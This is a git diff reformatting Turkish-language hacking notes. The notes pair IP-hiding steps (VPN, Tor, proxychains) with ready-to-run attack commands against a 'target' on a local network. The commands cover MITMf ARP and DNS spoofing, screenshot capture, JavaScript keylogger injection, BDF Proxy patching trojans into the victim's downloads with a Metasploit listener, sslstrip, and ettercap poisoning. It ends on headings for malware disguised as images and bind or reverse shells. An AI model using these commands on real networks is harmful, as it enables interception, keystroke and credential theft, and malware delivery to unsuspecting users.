@@ -2,14 +2,14 @@
 
 1.  Mozilla Firefox tarayıcıda Vpn kullanımı için web tarayıcı adres kısmına “about:config” gir.  
     “media.peerconnection.enable” -> false yap.  (Gerçek ip adresinin vpn kullanımında bazı yerlerde geçmesini engeller.)  
-    Vpnbook ‘a gir. Openvpn sekmesinden indirilen vpn dosyasını “unzip” ile çıkar. “openvpn açılacakportadı.ovpn” (Yükleme yaparken tarayıcı pencereleri kapat)
-2.  Opera tarayıcı içinde Vpn var.
-3.  www.dnsleaktest.com -> Hangi ülke ip’sinde olduğunu görme. Gerçek ip mizi bulunabilir mi test eder.  
+    Vpnbook ‘a gir. Openvpn sekmesinden indirilen vpn dosyasını “unzip” ile çıkar.  
+    “openvpn açılacakportadı.ovpn” (Yükleme yaparken tarayıcı pencereleri kapat)
+3.  Opera tarayıcı içinde Vpn var.
+4.  www.dnsleaktest.com -> Hangi ülke ip’sinde olduğunu görme. Gerçek ip mizi bulunabilir mi test eder.  
      
 
 ### TOR Browser
-
->   
+  
 > Kaliye Tor Kurma;  
 > “apt-get install tor -y”  
 > “apt-get install proxychains”  
@@ -22,47 +22,54 @@
 > \*\*Siteden girilen ip adresi değişti. Komut satırında ise hala eski ip mevcut. Onunda değişmesi için;  
 > “proxychains curl icanhazip.com”    => Yazacağın her komutun başına proxychains yaz, ip gizlenir.
 
-MITM (Man in the Middle Framework):  
-Yüklemek için     ->    “apt-get install mitmf”  
-“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0”  
-Güvenli Https isteklerini Http olarak açtırır. Hsts kullanan sitelerde çalışmaz. (Hsts: Adres satırına elle http girsen bile seni https sayfasına atar. Facebook ve gmail hsts kullanıyor)  
-MITM DNS  
-Sahte Dns adreslerine yönlendirme yapar.İstediğimiz ip adresine yönlendiririz.  
-“leafpad /etc/mitmfmitmf.conf” -> Açılan dosyada \[\[\[A\]\]\] yazan yer girilen sitenin yönlendirildiği ip nin yazıldığı yer. (\*.hotmail.com = 192.168.1.1)  
-Yönlendirmeyi başlatma :  
-“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --dns”
+### MITM (Man in the Middle Framework)  
+>Yüklemek için     ->    “apt-get install mitmf”  
+>“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0”  
+>Güvenli Https isteklerini Http olarak açtırır. Hsts kullanan sitelerde çalışmaz. (Hsts: Adres satırına elle http girsen bile seni https sayfasına atar. Facebook ve gmail hsts kullanıyor)  
 
-Ekran Görüntüsü Alma:  
-“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --screen --interval 20” (20 saniye)  
-Görüntülerin kaydedildiği yer : /var/log/mitmf  
-Hata verirse : “pip install Twisted=15.5.0”  
-Klavye Tuşlarını Takip Etmek:  
-“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --jskeylogger”  
-Java Script Kodlarını Çalıştırmak:  
-“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --inject --js-payload “alert(‘...’);”
+### MITM DNS  
+>Sahte Dns adreslerine yönlendirme yapar.İstediğimiz ip adresine yönlendiririz.  
+>“leafpad /etc/mitmfmitmf.conf” -> Açılan dosyada \[\[\[A\]\]\] yazan yer girilen sitenin yönlendirildiği ip nin yazıldığı yer. (\*.hotmail.com = 192.168.1.1)  
+>
+>Yönlendirmeyi başlatma :  
+>“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --dns”
+>
+>Ekran Görüntüsü Alma:  
+>“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --screen --interval 20” (20 saniye)  
+>Görüntülerin kaydedildiği yer : /var/log/mitmf  
+>Hata verirse : “pip install Twisted=15.5.0”  
+>
+>Klavye Tuşlarını Takip Etmek:  
+>“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --jskeylogger”  
+>
+>Java Script Kodlarını Çalıştırmak:  
+>“mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --inject --js-payload “alert(‘...’);”
+>
 
-BDF (Backdoor Factory) Proxy:  
-Hedef birşey indirmek istediğinde biz trojanımızı o dosyanın içine yamalıyoruz. Bunun için;  
-1-    Aynı ağda olmak  
-2-    Man in the middle olmak  
-3-    BDF Proxy ayarlarını yapmak gerekir.
+### BDF (Backdoor Factory) Proxy
+    Hedef birşey indirmek istediğinde biz trojanımızı o dosyanın içine yamalıyoruz. Bunun için;  
+    1-    Aynı ağda olmak  
+    2-    Man in the middle olmak  
+    3-    BDF Proxy ayarlarını yapmak gerekir.
 
-“leafpad /etc/bdfproxy/ bdfproxy.cfg”  
-1-    proxy mode = transparent  
-2-    Hedef işletim sistemi neyse ordaki host ip yerine kendi ip mizi yazıyoruz.  
-“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080”  
-(80’den gelen bağlantıyı 8080’e yönlendir)  
-“bdfproxy” yaz. Saldırıyı başlat.  
-MITM saldırısını başlat. Dinleme modu için;  
-“msfconsole -r /usr/share/bdfproxy/.... .rc (bdfproxy nin dinlediği dosya yolu)  
-SSL Strip Çalıştırma (Https’i Http’ye Çevirme)  
-“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000”
+    “leafpad /etc/bdfproxy/ bdfproxy.cfg”  
+    1-    proxy mode = transparent  
+    2-    Hedef işletim sistemi neyse ordaki host ip yerine kendi ip mizi yazıyoruz.  
+    “ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080”  
+    (80’den gelen bağlantıyı 8080’e yönlendir)  
+    “bdfproxy” yaz. Saldırıyı başlat.  
+    MITM saldırısını başlat. Dinleme modu için;  
+    “msfconsole -r /usr/share/bdfproxy/.... .rc (bdfproxy nin dinlediği dosya yolu)  
 
-“sslstrip”  
-Ettercap çalıştırma:  
-“ettercap -Tq -M arp:remote -S -i wlan0 /192.168.1.1//  /192.168.1.15//”  
-// -S -> sslstrip kendimiz yaptığımız için S koymalıyız.  
-Virüslü Dosyayı Görsel Dosya İle Birleştirme:
+### SSL Strip Çalıştırma (Https’i Http’ye Çevirme)  
+    “ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000”
+
+    “sslstrip”  
+
+### Ettercap çalıştırma:  
+    “ettercap -Tq -M arp:remote -S -i wlan0 /192.168.1.1//  /192.168.1.15//”  
+    // -S -> sslstrip kendimiz yaptığımız için S koymalıyız.  
+    Virüslü Dosyayı Görsel Dosya İle Birleştirme:
 
   
 BIND SHELL , REVERSE SHELL
